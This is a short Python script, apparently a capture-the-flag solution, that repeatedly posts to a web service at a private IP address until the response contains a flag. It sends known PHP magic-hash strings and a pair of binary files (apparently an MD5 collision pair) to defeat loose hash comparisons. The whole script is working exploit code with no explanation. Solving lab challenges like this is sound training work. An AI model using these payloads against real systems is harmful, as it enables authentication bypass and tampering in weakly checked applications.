# import time
# 
# target = int(time.time() + 15)
# 
# with open("target", "w") as f:
#     f.write(str(target))


import requests

url = 'http://192.168.163.147:10080/'


data1 = open("msg1.bin", "rb").read()
data2 = open("msg2.bin", "rb").read()
data = {
    'a1': 's878926199a',
    'b1': 's214587387a',
    'key': '0e215962017',
    'a2': data1,
    'b2': data2,
}

while True:
    resp = requests.post(url=url, data=data)
    print(resp.text)
    if "flag{" in resp.text:
        break
